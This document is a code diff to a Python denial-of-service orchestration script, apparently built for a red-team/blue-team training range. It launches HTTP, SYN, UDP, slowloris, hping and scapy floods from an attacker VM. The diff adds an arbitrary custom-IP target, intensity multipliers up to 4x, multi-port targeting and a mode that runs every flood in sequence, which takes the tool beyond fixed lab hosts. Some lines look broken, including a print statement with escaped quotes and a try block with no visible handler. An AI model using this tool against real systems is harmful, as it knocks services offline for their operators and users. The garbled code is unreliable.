@@ -41,14 +41,18 @@ Examples:
         help='Type of network attack to execute'
     )
 
-    # Target selection
+    # Target selection - Universal support
     parser.add_argument(
         '--target',
-        choices=['team1', 'team2', 'team3', 'windows_target', 'vuln_bank'],
-        help='Blue team target (team1=20.10.40.11, team2=192.168.50.11, team3=20.10.60.11, windows_target=192.168.50.81, vuln_bank=192.168.50.101)'
+        choices=['team1', 'team2', 'team3', 'windows_target', 'vuln_bank', 'custom'],
+        help='Blue team target (team1=20.10.40.11, team2=192.168.50.11, team3=20.10.60.11, windows_target=192.168.50.81, vuln_bank=192.168.50.101, custom=specify IP)'
+    )
+    parser.add_argument(
+        '--custom-target',
+        help='Custom target IP address (use with --target custom)'
     )
 
-    # Attack parameters
+    # Attack parameters - Universal configuration
     parser.add_argument(
         '--duration', type=int, default=300,
         help='Attack duration in seconds (default: 300)'
@@ -58,8 +62,24 @@ Examples:
         help='Target port (default: 9080 for DVWA)'
     )
     parser.add_argument(
+        '--ports',
+        help='Multiple target ports (comma-separated, e.g., 80,443,9080)'
+    )
+    parser.add_argument(
         '--num-attackers', type=int, default=3,
         help='Number of attacking VMs for distributed attacks (default: 3)'
+    )
+    parser.add_argument(
+        '--intensity', choices=['low', 'medium', 'high', 'maximum'], default='medium',
+        help='Attack intensity level (affects packet rates and resource usage)'
+    )
+    parser.add_argument(
+        '--payload-size', type=int,
+        help='Custom payload size for packet-based attacks (bytes)'
+    )
+    parser.add_argument(
+        '--all-attacks', action='store_true',
+        help='Run all attack types sequentially on the same target'
     )
 
     # Stress testing options
@@ -158,10 +178,23 @@ Examples:
     print("🔧 Initializing DDoS Orchestrator...")
     orchestrator = DDoSOrchestrator()
 
-    # Get target IP
-    target_ip = orchestrator.blue_team_targets.get(args.target)
-    if not target_ip:
-        print(f"❌ Invalid target team: {args.target}")
+    # Get target IP with universal support
+    if args.target == 'custom':
+        if not args.custom_target:
+            parser.error("--custom-target is required when using --target custom")
+        target_ip = args.custom_target
+        print(f"🎯 Using custom target: {target_ip}")
+    else:
+        target_ip = orchestrator.blue_team_targets.get(args.target)
+        if not target_ip:
+            print(f"❌ Invalid target team: {args.target}")
+            sys.exit(1)
+
+    # Validate target IP format
+    import re
+    ip_pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+    if not re.match(ip_pattern, target_ip):
+        print(f"❌ Invalid IP address format: {target_ip}")
         sys.exit(1)
 
     print(f"🎯 Target: {args.target} ({target_ip}:{args.port})")
@@ -179,15 +212,22 @@ Examples:
         monitoring_thread.daemon = True
         monitoring_thread.start()
 
-    # Execute network attack
-    print("\n🌐 Launching Network Attack...")
-    network_result = execute_network_attack(orchestrator, args, target_ip)
+    # Execute network attack(s)
+    attack_results = None
 
-    if not network_result:
-        print("❌ Network attack failed to launch")
-        sys.exit(1)
-
-    print(f"✅ Network attack launched: {network_result}")
+    if args.all_attacks:
+        print("\n🚀 Launching ALL ATTACKS sequentially on same target...")
+        all_attacks = ['http_flood', 'hping_heavy', 'syn_flood', 'udp_flood', 'slowloris', 'scapy_flood']
+        attack_results = execute_all_attacks(orchestrator, args, target_ip, all_attacks)
+        print(f"✅ All attacks launched: {len(attack_results)} attack types")
+    else:
+        print("\n🌐 Launching Network Attack...")
+        network_result = execute_network_attack(orchestrator, args, target_ip)
+        if not network_result:
+            print("❌ Network attack failed to launch")
+            sys.exit(1)
+        print(f"✅ Network attack launched: {network_result}")
+        attack_results = network_result
 
     # Execute stress tests if requested
     stress_results = []
@@ -224,7 +264,13 @@ Examples:
 
     # Summary
     print("\n📋 Attack Summary:")
-    print(f"   🌐 Network: {network_result.get('attack_id', 'N/A')}")
+    if isinstance(attack_results, dict) and 'multi_port_results' in attack_results:
+        print(f"   🌐 Multi-port attack: {len(attack_results['multi_port_results'])} ports")
+    elif isinstance(attack_results, dict) and len(attack_results) > 1:
+        print(f"   🌐 Multiple attacks: {len(attack_results)} attack types")
+    else:
+        attack_id = attack_results.get('attack_id', 'N/A') if isinstance(attack_results, dict) else str(attack_results)
+        print(f"   🌐 Network: {attack_id}")
 
     if stress_results:
         for stress in stress_results:
@@ -243,8 +289,10 @@ Examples:
         # Export metrics if requested
         if args.metrics and hasattr(orchestrator, 'export_metrics_report'):
             report_path = f"attack_metrics_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-            if orchestrator.export_metrics_report(report_path):
-                print(f"📊 Metrics exported to: {report_path}")
+            try:
+                success = orchestrator.export_metrics_report(report_path)
+                if success:
+                    print(f\"\ud83d\udcca Metrics exported to: {report_path}\")
                 # Try to get stats for display
                 try:
                     import json
@@ -261,108 +309,176 @@ Examples:
         print("\n🛑 User interrupted - attacks may still be running in background")
         print("   Use --stop-attacks to terminate all attacks")
 
+def get_intensity_multiplier(intensity):
+    """Get packet rate multiplier based on intensity level"""
+    multipliers = {
+        'low': 0.3,
+        'medium': 1.0,
+        'high': 2.0,
+        'maximum': 4.0
+    }
+    return multipliers.get(intensity, 1.0)
+
 def execute_network_attack(orchestrator, args, target_ip):
     """Execute the specified network attack type with realistic statistics"""
+
+    # Get intensity multiplier
+    intensity_mult = get_intensity_multiplier(args.intensity)
+
+    # Configure ports (single or multiple)
+    target_ports = [args.port]
+    if args.ports:
+        target_ports = [int(p.strip()) for p in args.ports.split(',')]
 
     # Show attack preparation info
     print(f"\n📡 Preparing {args.attack_type} attack...")
     print(f"   Attacker: Red Team Generator (192.168.60.62)")
-    print(f"   Target: {target_ip}:{args.port}")
+    print(f"   Target: {target_ip}:{target_ports if len(target_ports) > 1 else args.port}")
+    print(f"   Intensity: {args.intensity} ({intensity_mult}x multiplier)")
+    if args.payload_size:
+        print(f"   Payload: {args.payload_size} bytes (custom)")
 
     if args.attack_type == 'http_flood':
-        print(f"   Expected Rate: 1,000-5,000 HTTP requests/sec")
+        base_rate = int(1000 * intensity_mult), int(5000 * intensity_mult)
+        base_workers = max(10, int(50 * intensity_mult))
+        base_connections = max(25, int(100 * intensity_mult))
+
+        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} HTTP requests/sec")
         print(f"   Packet Size: ~1,500 bytes per request")
-        print(f"   Bandwidth: ~12-60 Mbps")
+        print(f"   Bandwidth: ~{int(12 * intensity_mult)}-{int(60 * intensity_mult)} Mbps")
+        print(f"   Workers: {base_workers}, Connections: {base_connections}")
 
-        return orchestrator.execute_http_flood(
-            attacker_vm="192.168.60.62",  # Attack Generator (OPNsense LAN)
-            target_ip=target_ip,
-            target_port=args.port,
-            duration=args.duration,
-            workers=50,
-            connections=100,
-            background=True
-        )
+        results = []
+        for port in target_ports:
+            result = orchestrator.execute_http_flood(
+                attacker_vm="192.168.60.62",  # Attack Generator (OPNsense LAN)
+                target_ip=target_ip,
+                port=port,
+                duration=args.duration,
+                workers=base_workers,
+                sockets=base_connections,
+                background=True
+            )
+            results.append(result)
 
+        return results[0] if len(results) == 1 else {'multi_port_results': results}
     elif args.attack_type == 'hping_heavy':
-        print(f"   Expected Rate: 10,000-50,000 packets/sec")
-        print(f"   Packet Size: 1,400 bytes (maximum payload)")
-        print(f"   Bandwidth: ~112-560 Mbps")
+        base_rate = int(10000 * intensity_mult), int(50000 * intensity_mult)
+        payload_size = args.payload_size if args.payload_size else 1400
 
-        return orchestrator.execute_hping_heavy(
-            attacker_vm="192.168.60.62",  # Attack Generator (OPNsense LAN)
-            target_ip=target_ip,
-            target_port=args.port,
-            duration=args.duration,
-            payload_size=1400,  # Large payload
-            rate="flood",
-            background=True
-        )
+        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} packets/sec")
+        print(f"   Packet Size: {payload_size} bytes payload")
+        print(f"   Bandwidth: ~{int(112 * intensity_mult)}-{int(560 * intensity_mult)} Mbps")
 
+        results = []
+        for port in target_ports:
+            result = orchestrator.execute_hping_heavy(
+                attacker_vm="192.168.60.62",  # Attack Generator (OPNsense LAN)
+                target_ip=target_ip,
+                target_port=port,
+                duration=args.duration,
+                payload_size=payload_size,
+                rate="flood" if intensity_mult >= 2.0 else "fast",
+                background=True
+            )
+            results.append(result)
+
+        return results[0] if len(results) == 1 else {'multi_port_results': results}
     elif args.attack_type == 'syn_flood':
-        print(f"   Expected Rate: 30,000-100,000 SYN packets/sec")
-        print(f"   Packet Size: 40-60 bytes (TCP SYN header)")
-        print(f"   Bandwidth: ~10-50 Mbps")
+        base_rate = int(30000 * intensity_mult), int(100000 * intensity_mult)
 
-        return orchestrator.execute_syn_flood(
-            attacker_vm="192.168.60.62",
-            target_ip=target_ip,
-            target_port=args.port,
-            duration=args.duration,
-            background=True
-        )
+        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} SYN packets/sec")
+        print(f"   Packet Size: 40-60 bytes (TCP SYN header)")
+        print(f"   Bandwidth: ~{int(10 * intensity_mult)}-{int(50 * intensity_mult)} Mbps")
+
+        results = []
+        for port in target_ports:
+            result = orchestrator.execute_syn_flood(
+                attacker_vm="192.168.60.62",
+                target_ip=target_ip,
+                target_port=port,
+                duration=args.duration,
+                background=True
+            )
+            results.append(result)
+
+        return results[0] if len(results) == 1 else {'multi_port_results': results}
 
     elif args.attack_type == 'udp_flood':
-        print(f"   Expected Rate: 20,000-80,000 UDP packets/sec")
-        print(f"   Packet Size: 1,024 bytes")
-        print(f"   Bandwidth: ~160-640 Mbps")
+        base_rate = int(20000 * intensity_mult), int(80000 * intensity_mult)
+        payload_size = args.payload_size if args.payload_size else 1024
 
-        return orchestrator.execute_udp_flood(
-            attacker_vm="192.168.60.62",
-            target_ip=target_ip,
-            target_port=args.port,
-            duration=args.duration,
-            background=True
-        )
+        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} UDP packets/sec")
+        print(f"   Packet Size: {payload_size} bytes")
+        print(f"   Bandwidth: ~{int(160 * intensity_mult)}-{int(640 * intensity_mult)} Mbps")
+
+        results = []
+        for port in target_ports:
+            result = orchestrator.execute_udp_flood(
+                attacker_vm="192.168.60.62",
+                target_ip=target_ip,
+                target_port=port,
+                duration=args.duration,
+                background=True
+            )
+            results.append(result)
+
+        return results[0] if len(results) == 1 else {'multi_port_results': results}
 
     elif args.attack_type == 'slowloris':
-        print(f"   Expected Rate: 10-100 slow connections/sec")
-        print(f"   Packet Size: 50-200 bytes (partial HTTP headers)")
-        print(f"   Bandwidth: ~1-5 Mbps (low bandwidth, high impact)")
+        base_rate = int(10 * intensity_mult), int(100 * intensity_mult)
 
-        return orchestrator.execute_slowloris(
-            attacker_vm="192.168.60.62",
-            target_ip=target_ip,
-            target_port=args.port,
-            duration=args.duration,
-            background=True
-        )
+        print(f"   Expected Rate: {base_rate[0]}-{base_rate[1]} slow connections/sec")
+        print(f"   Packet Size: 50-200 bytes (partial HTTP headers)")
+        print(f"   Bandwidth: ~{int(1 * intensity_mult)}-{int(5 * intensity_mult)} Mbps (low bandwidth, high impact)")
+
+        results = []
+        for port in target_ports:
+            result = orchestrator.execute_slowloris(
+                attacker_vm="192.168.60.62",
+                target_ip=target_ip,
+                target_port=port,
+                duration=args.duration,
+                background=True
+            )
+            results.append(result)
+
+        return results[0] if len(results) == 1 else {'multi_port_results': results}
 
     elif args.attack_type == 'scapy_flood':
-        print(f"   Expected Rate: 5,000-25,000 crafted packets/sec")
-        print(f"   Packet Size: Variable (custom payloads)")
-        print(f"   Bandwidth: ~40-200 Mbps")
+        base_rate = int(5000 * intensity_mult), int(25000 * intensity_mult)
 
-        return orchestrator.execute_scapy_flood(
-            attacker_vm="192.168.60.62",
-            target_ip=target_ip,
-            target_port=args.port,
-            duration=args.duration,
-            background=True
-        )
+        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} crafted packets/sec")
+        print(f"   Packet Size: Variable (custom payloads)")
+        print(f"   Bandwidth: ~{int(40 * intensity_mult)}-{int(200 * intensity_mult)} Mbps")
+
+        results = []
+        for port in target_ports:
+            result = orchestrator.execute_scapy_flood(
+                attacker_vm="192.168.60.62",
+                target_ip=target_ip,
+                target_port=port,
+                duration=args.duration,
+                background=True
+            )
+            results.append(result)
+
+        return results[0] if len(results) == 1 else {'multi_port_results': results}
 
     elif args.attack_type == 'distributed_http':
-        print(f"   Expected Rate: 3,000-15,000 HTTP requests/sec (distributed)")
+        base_rate = int(3000 * intensity_mult), int(15000 * intensity_mult)
+        num_attackers = min(6, max(2, int(args.num_attackers * intensity_mult)))
+
+        print(f"   Expected Rate: {base_rate[0]:,}-{base_rate[1]:,} HTTP requests/sec (distributed)")
         print(f"   Packet Size: ~1,500 bytes per request")
-        print(f"   Bandwidth: ~36-180 Mbps (from {args.num_attackers} VMs)")
+        print(f"   Bandwidth: ~{int(36 * intensity_mult)}-{int(180 * intensity_mult)} Mbps (from {num_attackers} VMs)")
 
         attack_ids = orchestrator.execute_distributed_attack(
             attack_type="http_flood",
             target_team=args.target,
             target_port=args.port,
             duration=args.duration,
-            num_attackers=args.num_attackers,
-            capture_on_target=args.capture,
+            num_attackers=num_attackers,
             background=True
         )
         return {'success': True, 'attack_id': f"distributed_{len(attack_ids)}_attacks", 'attack_ids': attack_ids}
@@ -370,6 +486,49 @@ def execute_network_attack(orchestrator, args, target_ip):
     else:
         print(f"❌ Unknown attack type: {args.attack_type}")
         return None
+
+def execute_all_attacks(orchestrator, args, target_ip, attack_types):
+    """Execute all attack types sequentially on the same target"""
+    results = {}
+
+    print(f"\n🎯 TARGET CONFIGURATION:")
+    print(f"   IP: {target_ip}")
+    print(f"   Ports: {args.ports if args.ports else args.port}")
+    print(f"   Duration per attack: {args.duration}s")
+    print(f"   Intensity: {args.intensity}")
+    print(f"   Total estimated time: {len(attack_types) * args.duration}s")
+
+    for i, attack_type in enumerate(attack_types, 1):
+        print(f"\n🚀 ATTACK {i}/{len(attack_types)}: {attack_type.upper()}")
+        print(f"   ⏰ Starting at: {datetime.now().strftime('%H:%M:%S')}")
+
+        # Temporarily override attack type
+        original_attack_type = args.attack_type
+        args.attack_type = attack_type
+
+        try:
+            result = execute_network_attack(orchestrator, args, target_ip)
+            results[attack_type] = result
+            print(f"   ✅ {attack_type} launched: {result}")
+
+            # Brief pause between attacks
+            if i < len(attack_types):
+                print(f"   ⏳ Waiting 10 seconds before next attack...")
+                time.sleep(10)
+
+        except Exception as e:
+            print(f"   ❌ {attack_type} failed: {e}")
+            results[attack_type] = {'error': str(e)}
+
+        # Restore original attack type
+        args.attack_type = original_attack_type
+
+    print(f"\n📊 ALL ATTACKS SUMMARY:")
+    for attack_type, result in results.items():
+        status = "✅" if 'error' not in str(result) else "❌"
+        print(f"   {status} {attack_type}: {result}")
+
+    return results
 
 def print_attack_options():
     """Print available attack types and targets"""
@@ -416,10 +575,10 @@ def run_quick_test():
         network_result = orchestrator.execute_http_flood(
             attacker_vm="192.168.60.62",  # Attack Generator (OPNsense LAN)
             target_ip=target_ip,
-            target_port=9080,
+            port=9080,
             duration=30,
             workers=10,
-            connections=50,
+            sockets=50,
             background=True
         )
 
